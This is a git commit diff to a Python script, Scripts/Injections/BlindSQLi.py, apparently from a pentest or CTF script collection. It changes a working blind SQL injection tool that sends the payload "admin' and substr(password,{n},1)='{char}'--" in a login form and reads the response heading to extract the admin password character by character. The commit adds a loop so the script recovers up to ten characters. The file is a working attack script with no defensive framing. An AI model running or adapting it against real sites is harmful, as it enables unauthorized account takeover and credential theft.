c5789984fd9965d578c6d9ec38cb6a8756edcb8a
SaAbyy <94359910+SaAbyy@users.noreply.github.com>
2024-01-30 21:45:34 +0100

    Update BlindSQLi.py

--- Scripts/Injections/BlindSQLi.py
+++ Scripts/Injections/BlindSQLi.py
@@ -1,28 +1,30 @@
 import requests
 from bs4 import BeautifulSoup
 
-url = 'http://xxxx.xxx'
-chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[{]}|;:,<.>/?'
+url = 'http://XXXX/XX/'
+chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
 n = 1
 password = []
 
-for char in (chars):
-    login_data = {
-        'username': f"admin' and substr(password,{n},1)='{char}'--",
-        'password': "test"
-    }
-    response = requests.post(url, data=login_data)
+for i in range(10):
+    for char in (chars):
+        login_data = {
+            'username': f"admin' and substr(password,{n},1)='{char}'--",
+            'password': "test"
+        }
+        response = requests.post(url, data=login_data)
 
-    if response.status_code == 200:
-        soup = BeautifulSoup(response.content, 'html.parser')
-        h2_title = soup.find('h2')
-        if h2_title and 'admin' in h2_title.text.lower():
-            print(f":{char}")
-            password.append(char)
-            n += 1
+        if response.status_code == 200:
+            soup = BeautifulSoup(response.content, 'html.parser')
+            h2_title = soup.find('h2')
+            if h2_title and 'admin' in h2_title.text.lower():
+                print(f":{char}")
+                password.append(char)
+                n += 1
+                break
+            else:
+                continue
         else:
-            continue
-    else:
-        print("Connexion failed")
+            print("Connexion failed")
 
-print("Password :","".join(password))
+    print("Password :","".join(password))
